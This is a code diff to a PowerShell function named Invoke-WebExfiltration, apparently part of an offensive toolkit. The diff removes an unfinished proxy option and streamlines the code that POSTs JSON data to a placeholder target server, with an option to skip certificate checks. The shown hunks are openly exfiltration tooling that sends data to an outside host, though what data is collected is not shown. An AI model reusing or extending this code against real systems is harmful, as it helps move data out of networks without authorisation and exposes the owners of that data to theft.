@@ -55,15 +55,12 @@ Function Invoke-WebExfiltration {
         )]
         [string]$Target = 'TARGET_PLACEHOLDER',
         [string]$Password,
-        [string]$Proxy,
         [switch]$Insecure
     )
 
     Begin {
         Write-Host "[~] Target server: '$target'"
-        if ($Proxy){
-            Write-Host "[!] Using HTTP proxy: '$Proxy'"
-        }
+
         if ((-Not $Password) -And (-Not $unencrypted)) {
             $Password = Read-Host -MaskInput '[*] Password'
 
@@ -162,21 +159,13 @@ Function Invoke-WebExfiltration {
         # $rest_timeout = 10
 
         try {
-            if ($Proxy){
-                # $uriProxy = [uri]::EscapeUriString($Proxy)
-                # [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-                # Invoke-WebRequest -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json" -Proxy $uriProxy
-                # if ($Insecure){} else {}
-                Write-Host "[X] Error: Proxy not supported yet. I'm not sending anything!"
-
+            if ($Insecure){
+                Write-Verbose "Ignoring certificate check"
+                $response = Invoke-WebRequest -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json" -SkipCertificateCheck
             } else {
-                if ($Insecure){
-                    Write-Verbose "Ignoring certificate check"
-                    $response = Invoke-WebRequest -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json" -SkipCertificateCheck
-                } else {
-                    $response = Invoke-WebRequest -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json"
-                }
+                $response = Invoke-WebRequest -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json"
             }
+
         }catch [System.Net.WebException] {
             if($_.Exception.Status -eq 'Timeout'){
                 Write-Host "[X] Error: Send data to server but got timeout after $rest_timeout sec. "
